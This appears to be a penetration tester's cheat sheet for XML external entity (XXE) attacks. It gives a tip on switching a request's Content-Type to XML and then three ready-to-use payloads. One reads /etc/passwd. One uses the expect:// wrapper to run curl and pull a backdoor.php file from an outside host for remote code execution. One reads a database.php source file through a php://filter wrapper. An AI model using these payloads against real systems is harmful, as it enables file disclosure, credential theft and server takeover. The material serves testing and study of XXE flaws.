# Tips
- **If you are submiting a POST Request with the Header _"Content-Type: application/json" _  try to change to  _"Content-Type: application/xml"_**

# Payloads ðŸ§¨
## Simple
```
<?xml version="1.0" encoding="UTF-8" ?>

<!DOCTYPE jagelito [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<search>name</search>
<value>&xxe;</value>
</root>
```

## RCE
```
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE root [  
<!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:8000/backdoor.php'">  
]>  
<root>  
<name>Joe</name>  
<tel>ufgh</tel>  
<email>START_&file;_END</email>  
<password>kjh</password>  
</root>
```

## PHP Wrapper
Useful to read .php files
```
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=database.php"> ]>

<root>
<data>&xxe;</data>
</root>
```

# Resources
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
- From XML to RCE https://programmersought.com/article/74883984168/